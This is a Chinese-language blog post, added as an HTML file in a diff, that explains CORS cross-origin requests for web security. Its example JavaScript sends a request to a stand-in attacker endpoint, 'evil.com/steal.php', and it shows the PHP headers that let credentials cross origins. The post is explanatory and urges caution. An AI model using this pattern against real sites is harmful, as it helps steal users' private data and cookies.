@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="google-site-verification" content="eGNFdt2ztR4hEzEBjDkGQUWo0r_iPHpw1hoLqy-UUb0" />
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1" />
+  <meta name="renderer" content="webkit">
+  
+  <title>CORS跨域资源共享 | ThinkerChan</title>
+  <meta name="description" content="请求域这段代码放在请求域上 ， 本域地址： http://www.foo.com function createCORSRequest(method, url){      var xhr = new XMLHttpRequest();      if (&amp;quot;withCredentials&amp;quot; in xhr){           xhr.open(method, url, tru">
+<meta name="keywords" content="cors">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CORS跨域资源共享">
+<meta property="og:url" content="http://thinkerchan.com/2015/05/30/web-safe/index.html">
+<meta property="og:site_name" content="ThinkerChan">
+<meta property="og:description" content="请求域这段代码放在请求域上 ， 本域地址： http://www.foo.com function createCORSRequest(method, url){      var xhr = new XMLHttpRequest();      if (&amp;quot;withCredentials&amp;quot; in xhr){           xhr.open(method, url, tru">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2016-01-07T02:03:06.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CORS跨域资源共享">
+<meta name="twitter:description" content="请求域这段代码放在请求域上 ， 本域地址： http://www.foo.com function createCORSRequest(method, url){      var xhr = new XMLHttpRequest();      if (&amp;quot;withCredentials&amp;quot; in xhr){           xhr.open(method, url, tru">
+<meta name="twitter:creator" content="@thinkerchan">
+<meta property="fb:admins" content="thinkerchan">
+  
+  <link rel="alternate" href="/atom.xml" title="ThinkerChan" type="application/rss+xml">
+  
+
+  <link rel="stylesheet" href="/css/style.css" >
+  <link rel="shortcut icon" href="/images/favicon.png"/>
+  <script data-main="/js/build" src="/js/require.js"></script>
+  <!--[if lt IE 7]>
+  <style>
+    .section{
+      width: 780px;
+    }
+    .post-content img{
+      width: 100%;
+    }
+    .jupe pre{
+      width: 100%;
+    }
+  </style>
+  <![endif]-->
+</head>
+<body>
+
+<div class="section-wrap section-main">
+	<div class="section">
+		<div class="header">
+	<h1 class="logo">
+		<a href="/">胖子</a>
+	</h1>
+	<p class="social-links">
+		<a href="/atom.xml"  target="_blank">RSS</a>
+		\
+		<a href="http://weibo.com/thinkerchank/" target="_blank">微博</a>
+		\
+		<a href="http://www.zhihu.com/people/chen-xin-kai-98" target="_blank">知乎</a>
+		\
+		<a href="https://github.com/thinkerchan" target="_blank">Github</a>
+	</p>
+</div>
+		<div class="main">
+						<div class="jupe main-body">
+				<div class="post-content">
+					<h1 class="post-title">CORS跨域资源共享</h1>
+					<div class="post-meta">
+						<span class="post-time">2015.05.30</span>
+						<div class="post-cats">
+							<a class="post-cats-item-link" href="/categories/Web安全/">Web安全</a>
+						</div>
+					</div>
+					<div class="post-toc">
+						<div class="toc-title">TOC</div>
+						<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#请求域"><span class="toc-number">1.</span> <span class="toc-text">请求域</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#目标域"><span class="toc-number">2.</span> <span class="toc-text">目标域</span></a></li></ol>
+					</div>
+					<h2 id="请求域"><a href="#请求域" class="headerlink" title="请求域"></a>请求域</h2><p>这段代码放在请求域上 ， 本域地址： <a href="http://www.foo.com" target="_blank" rel="noopener">http://www.foo.com</a></p>
+<pre><code>function createCORSRequest(method, url){
+     var xhr = new XMLHttpRequest();
+     if (&quot;withCredentials&quot; in xhr){
+          xhr.open(method, url, true);
+     } else if (typeof XDomainRequest != &quot;undefined&quot;){
+          xhr = new XDomainRequest( ); // IE 浏览器
+          xhr.open(method, url);
+     } else {
+          xhr = null;
+     }
+     return xhr;
+}
+var request = createCORSRequest(&quot;get&quot;, &quot;http://www.evil.com/steal.php&quot;);
+if (request){
+     request.onload = function(){ // 请求成功后
+     alert(request.responseText); // 弹出响应的数据
+};
+     request.send(); // 发送请求
+}
+</code></pre><h2 id="目标域"><a href="#目标域" class="headerlink" title="目标域"></a>目标域</h2><p>这段代码放在目标域上 , 本域地址:  <a href="http://www.evil.com/steal.php" target="_blank" rel="noopener">http://www.evil.com/steal.php</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> header(<span class="string">"Access-Control-Allow-Origin: http://www.foo.com"</span>);</span><br><span class="line"> <span class="comment">// header里面存放请求域的地址 ， 如果是通配符 * ，代表可以被任意域请求资源。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>即便是 Access-Control-Allow-Origin 不设置请求域的 地址 ，只要请求域向目标域中发送请求，那么目标域一样会接受发送过来的数据，只是浏览器会报错。如果目标域不设置 Access-Control-Allow-Origin: <code>http://www.foo.com</code>，那么隐私数据可以被偷到吗？答案是肯定的。虽然浏览器会报权限错误的问题，但实际上隐私数据已经被目标域的 steal.php 接收到了。</p>
+<p>默认情况下，这样的跨域无法带上目标域的会话（ Cookies 等），需要设置 xhr 实例的<br><code>withCredentials</code>属性为 true（ IE 还不支持），同时目标域的 steal.php 必须设置如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Access-Control-Allow-Origin: http://www.foo.com"</span>);</span><br><span class="line">header(<span class="string">"Access-Control-Allow-Credentials: true"</span>); <span class="comment">// 允许跨域证书发送</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>有 一 点 需 要 注 意 ， 如果 设 置 了 Access-Control-Allow-Credentials 为 true ，那么<code>Access-Control-Allow-Origin</code>就不能设置为*通配符，这也是浏览器为了安全进行的考虑。有了 CORS 机制，跨域就变得特别方便了，该功能要慎重使用，否则后果会很严重。</p>
+
+				</div>
+				<div class="post-share">
+	<ul class="share-list">
+		<li><a class="icon icon-weibo" href="javascript:share.weibo();"><span>weibo</span></a></li>
+		<li><a class="icon icon-twitter" href="javascript:share.twitter();"><span>twitter</span></a></li>
+		<li><a class="icon icon-douban" href="javascript:share.douban();"><span>douban</span></a></li>
+		<li><a class="icon icon-qzone" href="javascript:share.qzone();"><span>qzone</span></a></li>
+	</ul>
+</div>
+				<div class="post-comments">
+	<div class="ds-thread" data-thread-key="" data-title="CORS跨域资源共享" data-url="http://thinkerchan.com/2015/05/30/web-safe/"></div>
+	<script type="text/javascript">
+  var duoshuoQuery = {short_name:"Thinkerchan"};
+	(function() {
+	  var ds = document.createElement('script');
+	  ds.type = 'text/javascript';ds.async = true;
+	  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+	  ds.charset = 'UTF-8';
+	  (document.getElementsByTagName('head')[0]
+	   || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+</div>
+			</div>		</div>
+		<div class="footer">
+	<p class="left">&copy; Thinker Chan , 什么都不会。</p>
+	<p class="right">Base on <a href="https://github.com/thinkerchan" target="_blank">Github</a> and <a href="http://hexo.io/" target="_blank">Hexo</a> , Theme By <a href="http://yujiangshui.com/" target="_blank">于江水</a> .</p>
+</div>
+	</div>
+</div>
+
+
+</body>
+</html>
